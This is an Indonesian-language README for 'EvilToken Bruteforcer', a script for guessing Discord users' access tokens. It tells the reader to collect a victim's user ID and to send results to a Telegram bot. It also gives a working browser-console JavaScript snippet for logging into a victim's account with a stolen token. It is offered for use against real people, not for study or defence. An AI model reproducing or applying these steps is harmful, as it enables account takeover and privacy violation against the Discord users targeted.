# EvilToken Bruteforcer.
Script ini digunakan untuk membruteforce atau menebak - nebak token access login untuk user Discord.
Gw cuma improve code, gw terima kasih ke @NAOYY karena sudah publikasikan source code. Cross Platform, sudah diuji coba via sistem Macintosh OS dan Microsoft Windows. Kurang tau kalo di Termux bisa ato kagak.

## Screenshots Program.
![Screenshot MacOS](https://i.ibb.co/zxSLDDP/photo-2021-02-03-12-36-19.jpg)
![Screenshot Windows](https://i.ibb.co/rpzQztd/Entod-Token-SS.jpg)
## Installation

Dibutuhkan Python versi 3, dan tentunya [pip](https://pip.pypa.io/en/stable/) untuk install module.

```python
pip install signal
pip install discord
pip install colorama
```

## Cara Penggunaan

Cukup mudah, tinggal diedit saja source code ke info pribadi kalian sesuka saja. Paling tinggal di edit Bot Token sama User ID masing masing saja.

```python
# Mengirim pesan ke Bot Telegram.
def sendteleg(botmsg):
   bot_token = 'BotTokenLo'
   bot_chatID = 'UserIDLo'
```

Pastikan juga sudah mengubah setting Discord ke Developer Mode untuk mendapatkan User ID Discord Victim. Caranya tinggal ke Settings > Appearance > Developer Mode. Kalo semisal sudah di aktifkan, tinggal diklik kanan victimnya dan dipaling bawah ada tulisan "Copy ID". Masukkan saja ke Dalam Program.

![bro](https://i.ibb.co/tz4zYTg/image.png)

Sukses bruteforcingnya? Tinggal login pakai token yang sukses dibruteforce saja. Cara untuk login via token juga sebenernya lumayan gampang cara loginnya. Tinggal butuh knowledge dikit dikit tentang Browser.

1. Buka Incognito Mode di Google Chrome.
2. Pergi ke https://discord.com/app.
3. Buka Developer Tools dan pergi ke Console.
4. Copy Paste Kode Berikut.

```js
(function() {
    window.t = "GANTI INI JADI TOKEN VICTIM"
    window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
    window.setInterval(() => window.localStorage.token = `"${window.t}"`);
    window.location.reload();
})();
```

5. Enter dan boom, logged in.

## Contributing
Bebas dah mau lu apain, tapi asalkan lu gak jual belikan nih program sama ngaku ngaku ni buatan lo. Awas aja dah kalo sampe ketahuan, asu emang skidder bangke. Kalo semisal ada saran, bisa contact ke gw : @FallenV4 via Telegram.

Please donate ke gw, gw gak ada penghasilan buat program ginian asu.

[PayPal](https://paypal.me/akmalpv4) |
[Saweria](https://saweria.co/fallenv4) | [YouTube](https://www.youtube.com/channel/UCPlVO-tSnP8TCMDKLx49Rwg) | [Group Telegram](https://t.me/fallenkuy)
## Kenapa gw buat ini?
Ada alasan tertentu, pastinya :).
